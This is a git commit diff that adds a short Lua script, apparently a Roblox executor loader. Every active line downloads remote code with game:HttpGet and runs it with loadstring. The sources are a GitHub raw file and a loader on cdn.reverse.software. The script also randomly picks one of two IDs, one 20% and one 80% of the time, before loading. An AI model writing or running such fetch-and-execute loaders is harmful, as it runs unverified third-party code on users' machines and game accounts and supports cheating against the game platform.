01d47bdc4a65268906f18f6b305dc0e29b07575d
Miguel7172 <romaozin1607@gmail.com>
2025-08-20 19:24:18 -0300

    Adicionando script13.lua automaticamente

---
+++ script13.lua
@@ -0,0 +1,12 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Miguel7172/Loading-UI/refs/heads/main/loading"))()
+
+
+local chance = math.random(1, 100)
+
+if chance <= 20 then
+    ID = "d98f46c5-df0d-4ba3-9db0-61244be7c8e6"
+    loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+else
+    ID="4c319a53-c9e4-400b-a1d2-8d16474dc2e1";
+loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
+end
